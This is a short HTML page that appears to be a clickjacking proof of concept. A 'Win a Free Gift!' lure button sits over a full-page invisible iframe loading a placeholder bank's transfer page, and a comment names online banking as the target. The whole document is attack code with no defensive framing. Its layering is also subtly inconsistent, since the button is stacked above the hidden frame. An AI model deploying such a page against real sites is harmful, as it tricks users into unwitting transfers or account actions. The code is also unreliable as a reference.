<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Win a Free Gift!</title>
    <style>
        iframe {
            opacity: 0;  /* Make the iframe invisible */
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2;
        }
        .fake-button {
            position: absolute;
            top: 50px;
            left: 50px;
            background-color: red;
            color: white;
            padding: 20px;
            font-size: 20px;
            cursor: pointer;
            z-index: 3;  /* Ensures the button is clickable */
        }
    </style>
</head>
<body>
    <h1>Click Below to Win a Free Gift!</h1>
    <div class="fake-button">Click Here</div>
    
    <!-- Embedding a victim's website (e.g., online banking) -->
    <iframe src="https://victim-bank.com/transfer" frameborder="0"></iframe>
</body>
</html>
